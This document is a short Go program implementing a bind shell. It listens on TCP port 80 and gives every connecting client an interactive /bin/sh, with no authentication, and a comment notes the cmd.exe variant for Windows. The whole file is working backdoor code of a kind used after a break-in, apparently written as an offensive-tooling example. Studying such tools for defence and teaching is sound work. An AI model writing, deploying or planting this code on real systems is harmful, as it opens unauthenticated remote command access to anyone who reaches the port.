package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection.
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	// Listen on local port 80
	listener, err := net.Listen("tcp", ":80")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		go handle(conn)
	}
}
